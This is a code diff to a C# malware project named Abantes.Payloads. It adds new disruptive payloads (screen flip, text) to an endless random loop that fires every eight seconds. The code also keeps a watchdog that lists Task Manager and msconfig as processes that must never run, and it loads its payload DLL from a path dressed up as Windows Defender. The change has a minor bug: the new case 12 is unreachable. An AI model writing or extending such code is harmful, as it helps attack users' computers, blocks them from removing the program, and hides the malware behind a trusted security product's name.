@@ -24,7 +24,7 @@ namespace Abantes.Payloads
             Thread cursoricon = new Thread(new ThreadStart(Annoying.CursorIcon));
             while (true)
             {
-                switch (_random.Next(10))
+                switch (_random.Next(12))
                 {
                     case 0:
                         Thread randomOSsound = new Thread(new ThreadStart(Annoying.RandomOSSounds));
@@ -80,11 +80,19 @@ namespace Abantes.Payloads
                         Thread crazybounce = new Thread(new ThreadStart(Annoying.CrazyBounce));
                         crazybounce.Start();
                         break;
+                    case 11:
+                        Thread flip = new Thread(new ThreadStart(Annoying.Flip));
+                        flip.Start();
+                        break;
+                    case 12:
+                        Thread text = new Thread(new ThreadStart(Annoying.Text));
+                        text.Start();
+                        break;
                 }
                 Thread.Sleep(8000);
             }
         }
-        public static void WathcDogThread()
+        public static void WatchDogThread()
         {
             string[] NeverRun = { "msconfig", "taskmgr" };
             string[] MustRun = { "Rules" };
@@ -118,6 +126,10 @@ namespace Abantes.Payloads
         public static extern void CursorIcon();
         [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?CrazyBounce@Payloads@1@QAEXXZ")]
         public static extern void CrazyBounce();
+        [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?Text@Payloads@1@QAEXXZ")]
+        public static extern void Text();
+        [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?Flip@Payloads@1@QAEXXZ")]
+        public static extern void Flip();
         static Point Position;
         static Random _random = new Random();
         public static void MouseTrap()
